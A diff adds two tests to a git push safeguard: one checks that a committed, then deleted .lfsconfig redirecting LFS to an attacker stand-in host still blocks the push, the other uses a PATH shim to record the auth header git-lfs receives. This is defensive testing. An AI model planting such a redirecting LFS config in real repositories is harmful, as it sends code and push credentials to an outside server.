@@ -692,6 +692,34 @@ describe("vettedPush: a branch's LFS objects reach origin though hooks are off (
   expect(existsSync(lfsObject(origin, oid))).toBe(false);
  });
 
+ test("a .lfsconfig committed and then deleted from the worktree still refuses the push", async () => {
+  const { worktree, origin } = await lfsBranch("90", { ".lfsconfig": "[lfs]\n\turl = https://attacker.example/lfs\n" });
+  rmSync(join(worktree, ".lfsconfig"));
+  await expect(
+   vettedPush({ worktree, canonical, branch: "node/90-x", credential, configSnapshot: gitConfigSnapshot(canonical) }),
+  ).rejects.toThrow(/\.lfsconfig/);
+  expect(await branchRef(origin, "node/90-x")).toBe("");
+ });
+
+ test("git-lfs sees the push credential as git's auth header", async () => {
+  const { worktree } = await lfsBranch("91");
+  const seen = join(dir, "lfs-saw-header");
+  const recordingLfs = join(dir, "recording-lfs");
+  mkdirSync(recordingLfs);
+  writeFileSync(join(recordingLfs, "git-lfs"), `#!/bin/sh\ngit config --get-all http.extraheader > "${seen}"\nexit 0\n`);
+  chmodSync(join(recordingLfs, "git-lfs"), 0o755);
+  const path = process.env.PATH;
+  process.env.PATH = `${recordingLfs}:${path}`;
+  try {
+   await vettedPush({ worktree, canonical, branch: "node/91-x", credential, configSnapshot: gitConfigSnapshot(canonical) });
+  } finally {
+   process.env.PATH = path;
+  }
+  expect(readFileSync(seen, "utf8").trim()).toBe(
+   `AUTHORIZATION: basic ${Buffer.from("placeholder:x-oauth-basic").toString("base64")}`,
+  );
+ });
+
  test("a branch with no LFS rule pushes without calling git-lfs", async () => {
   const origin = await git(["remote", "get-url", "origin"]);
   const worktree = await bootstrapWorktree(canonical, "88", "x", credential);
